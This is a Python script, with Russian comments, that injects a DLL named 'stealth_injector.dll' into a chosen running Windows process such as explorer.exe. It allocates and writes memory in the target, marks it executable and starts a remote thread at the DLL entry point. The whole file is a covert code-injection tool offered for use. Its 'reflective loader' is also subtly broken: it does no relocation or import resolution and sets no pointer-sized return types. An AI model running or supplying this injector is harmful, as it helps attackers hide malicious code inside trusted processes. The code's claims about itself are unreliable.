import ctypes
import sys
import struct

if sys.platform != "win32":
    print("[-] This script works only on Windows")
    sys.exit(1)

kernel32 = ctypes.windll.kernel32
ntdll = ctypes.windll.ntdll

PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READWRITE = 0x40

class PROCESSENTRY32(ctypes.Structure):
    _fields_ = [
        ("dwSize", ctypes.c_ulong),
        ("cntUsage", ctypes.c_ulong),
        ("th32ProcessID", ctypes.c_ulong),
        ("th32DefaultHeapID", ctypes.c_void_p),
        ("th32ModuleID", ctypes.c_ulong),
        ("cntThreads", ctypes.c_ulong),
        ("th32ParentProcessID", ctypes.c_ulong),
        ("pcPriClassBase", ctypes.c_long),
        ("dwFlags", ctypes.c_ulong),
        ("szExeFile", ctypes.c_char * 260),
    ]

# ====================== ПРОПЕР REFLECTIVE LOADER ======================
def reflective_inject_dll(pid: int, dll_bytes: bytes):
    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not h_process:
        raise ctypes.WinError()

    try:
        dll_size = len(dll_bytes)
        print(f"[+] Allocating {dll_size} bytes in target process...")

        # Выделяем память
        remote_base = kernel32.VirtualAllocEx(h_process, None, dll_size,
                                              MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
        if not remote_base:
            raise ctypes.WinError()

        # Записываем DLL
        written = ctypes.c_size_t(0)
        kernel32.WriteProcessMemory(h_process, remote_base, dll_bytes, dll_size, ctypes.byref(written))

        # Парсим PE заголовки
        dos_header = struct.unpack_from("<H", dll_bytes, 0)[0]
        if dos_header != 0x5A4D:  # MZ
            raise Exception("Invalid MZ signature")

        e_lfanew = struct.unpack_from("<I", dll_bytes, 0x3C)[0]
        nt_header = remote_base + e_lfanew

        # Получаем EntryPoint RVA
        entry_point_rva = struct.unpack_from("<I", dll_bytes, e_lfanew + 0x28)[0]  # OptionalHeader.AddressOfEntryPoint
        entry_point = remote_base + entry_point_rva

        print(f"[+] EntryPoint found at: {hex(entry_point)}")

        # Меняем защиту на EXECUTE
        old_protect = ctypes.c_ulong(0)
        kernel32.VirtualProtectEx(h_process, remote_base, dll_size, PAGE_EXECUTE_READWRITE, ctypes.byref(old_protect))

        # Вызываем DllMain через NtCreateThreadEx
        h_thread = ctypes.c_void_p(0)

        # Исправленный вызов NtCreateThreadEx
        status = ntdll.NtCreateThreadEx(
            ctypes.byref(h_thread),
            0x1FFFFF,           # DesiredAccess
            None,               # ObjectAttributes
            h_process,
            entry_point,        # StartRoutine = DllMain
            remote_base,        # Argument = hModule (base address)
            0,                  # CreateFlags
            0, 0, 0, None
        )

        if status == 0:
            print(f"[+] Reflective DLL Injection successful! Thread: {h_thread.value}")
            kernel32.WaitForSingleObject(h_thread, 10000)
        else:
            print(f"[-] NtCreateThreadEx failed with status: 0x{status:08X}")
            # Fallback
            h_thread = kernel32.CreateRemoteThread(h_process, None, 0, entry_point, remote_base, 0, None)

    except Exception as e:
        print(f"[-] Error during injection: {e}")
    finally:
        if 'h_process' in locals():
            kernel32.CloseHandle(h_process)
        if 'h_thread' in locals() and h_thread.value:
            kernel32.CloseHandle(h_thread)


# ====================== MAIN ======================
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python loader.py <target_process>")
        print("Example: python loader.py explorer.exe")
        sys.exit(1)

    target = sys.argv[1]
    dll_path = "stealth_injector.dll"

    try:
        with open(dll_path, "rb") as f:
            dll_bytes = f.read()

        print(f"[+] Loaded {len(dll_bytes)} bytes from {dll_path}")

        # Поиск процесса
        snapshot = kernel32.CreateToolhelp32Snapshot(0x00000002, 0)
        pe = PROCESSENTRY32()
        pe.dwSize = ctypes.sizeof(PROCESSENTRY32)

        found = False
        if kernel32.Process32First(snapshot, ctypes.byref(pe)):
            while True:
                if pe.szExeFile.decode('utf-8', errors='ignore').lower() == target.lower():
                    print(f"[+] Found target: {target} → PID: {pe.th32ProcessID}")
                    reflective_inject_dll(pe.th32ProcessID, dll_bytes)
                    found = True
                    break
                if not kernel32.Process32Next(snapshot, ctypes.byref(pe)):
                    break

        if not found:
            print(f"[-] Process '{target}' not found")

    except Exception as e:
        print(f"[-] Critical error: {e}")
    finally:
        kernel32.CloseHandle(snapshot)